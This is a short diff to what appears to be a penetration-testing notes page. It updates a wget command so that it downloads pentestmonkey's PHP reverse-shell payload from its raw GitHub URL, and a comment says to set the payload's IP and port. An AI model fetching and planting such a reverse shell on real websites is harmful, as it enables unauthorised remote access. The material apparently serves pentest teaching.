@@ -104,7 +104,7 @@ render_with_liquid: false
         [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell){:target="_blank"} is an awesome payload against a website using PHP.
 
         ```sh
-        wget https://github.com/pentestmonkey/php-reverse-shell -O shell.php
+        wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
 
         # Edit $ip and $port to your local ip:port in the payload
 
